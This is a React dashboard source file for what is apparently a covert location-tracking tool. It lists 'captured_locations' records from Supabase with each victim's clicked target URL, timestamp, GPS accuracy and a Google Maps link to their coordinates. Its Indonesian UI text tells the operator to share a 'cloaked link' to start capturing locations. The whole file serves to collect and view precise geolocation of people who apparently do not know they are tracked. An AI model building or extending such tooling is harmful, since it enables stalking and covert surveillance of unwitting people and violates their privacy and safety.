
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../services/supabaseClient';
import { MapPin, Clock, Users, ChevronRight, LayoutDashboard, ArrowLeft, RefreshCw, Globe, MousePointer2 } from 'lucide-react';

export const Dashboard: React.FC = () => {
  const navigate = useNavigate();
  const [captures, setCaptures] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  const loadData = async () => {
    setLoading(true);
    try {
      // Try Supabase first now that it's configured
      const { data, error } = await supabase
        .from('captured_locations')
        .select('*')
        .order('created_at', { ascending: false });

      if (!error && data && data.length > 0) {
        setCaptures(data);
        setLoading(false);
        return;
      }

      // Fallback to local API if Supabase is empty or fails
      const response = await fetch('/api/captures');
      if (response.ok) {
        const localData = await response.json();
        setCaptures(localData || []);
      }
    } catch (error) {
      console.error('Failed to load dashboard data', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadData();
    
    // Real-time subscription
    const subscription = supabase
      .channel('public:captured_locations')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'captured_locations' }, (payload) => {
        setCaptures(prev => [payload.new, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(subscription);
    };
  }, []);

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button 
              onClick={() => navigate('/')}
              className="p-2 hover:bg-slate-100 rounded-full transition-colors"
            >
              <ArrowLeft className="w-5 h-5 text-slate-500" />
            </button>
            <div className="flex items-center gap-2">
              <div className="bg-indigo-600 p-1.5 rounded-lg">
                <LayoutDashboard className="w-5 h-5 text-white" />
              </div>
              <h1 className="font-bold text-xl tracking-tight">Live Feed</h1>
            </div>
          </div>
          <button 
            onClick={loadData}
            className="p-2 text-slate-400 hover:text-indigo-600 transition-colors"
          >
            <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
          </button>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-6 py-12">
        {loading && captures.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-32">
            <div className="w-12 h-12 border-4 border-indigo-600 border-t-transparent animate-spin rounded-full mb-4"></div>
            <p className="text-slate-400 font-medium tracking-widest uppercase text-[10px] font-bold">Menghubungkan ke Supabase...</p>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-slate-400 uppercase tracking-widest">Recent Captures</h2>
              <span className="bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider">
                {captures.length} Total Hits
              </span>
            </div>

            {captures.length === 0 ? (
              <div className="bg-white border border-slate-200 border-dashed rounded-[2rem] p-24 text-center">
                <div className="w-16 h-16 bg-slate-50 rounded-2xl flex items-center justify-center mx-auto mb-6">
                  <Globe className="w-8 h-8 text-slate-300" />
                </div>
                <h3 className="text-lg font-bold mb-2 text-slate-400 uppercase">Belum ada data masuk</h3>
                <p className="text-slate-400 text-sm">Bagikan link cloaked Anda untuk mulai menangkap lokasi.</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-4">
                {captures.map((capture, idx) => (
                  <div 
                    key={capture.id || idx}
                    className="group bg-white border border-slate-200 rounded-3xl p-6 hover:shadow-xl hover:border-indigo-100 transition-all flex flex-col md:flex-row md:items-center justify-between gap-6"
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-3 mb-3">
                        <div className="bg-indigo-50 text-indigo-600 p-2 rounded-xl">
                          <MapPin className="w-5 h-5" />
                        </div>
                        <div>
                          <h4 className="font-bold text-lg truncate group-hover:text-indigo-600 transition-colors">
                            {capture.target_url ? new URL(capture.target_url).hostname : 'Unknown Target'}
                          </h4>
                          <div className="flex items-center gap-3 text-[10px] text-slate-400 font-bold uppercase tracking-wider">
                            <span className="flex items-center gap-1">
                              <Clock className="w-3 h-3" />
                              {new Date(capture.created_at || capture.timestamp).toLocaleString()}
                            </span>
                            <span className="flex items-center gap-1">
                              <MousePointer2 className="w-3 h-3" />
                              {capture.element?.text || 'Click Event'}
                            </span>
                          </div>
                        </div>
                      </div>
                      <div className="bg-slate-50 rounded-xl p-3 border border-slate-100 text-[11px] text-slate-500 font-mono truncate">
                        {capture.target_url}
                      </div>
                    </div>

                    <div className="flex items-center gap-6">
                      <div className="text-right">
                        <div className="text-xl font-black text-slate-900">±{Math.round(capture.accuracy)}m</div>
                        <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest text-right">Accuracy</div>
                      </div>
                      <a 
                        href={`https://www.google.com/maps/search/?api=1&query=${capture.latitude},${capture.longitude}`}
                        target="_blank" rel="noopener noreferrer"
                        className="w-12 h-12 bg-slate-900 text-white rounded-2xl flex items-center justify-center hover:bg-indigo-600 transition-all shadow-lg shadow-slate-200"
                      >
                        <ChevronRight className="w-6 h-6" />
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  );
};
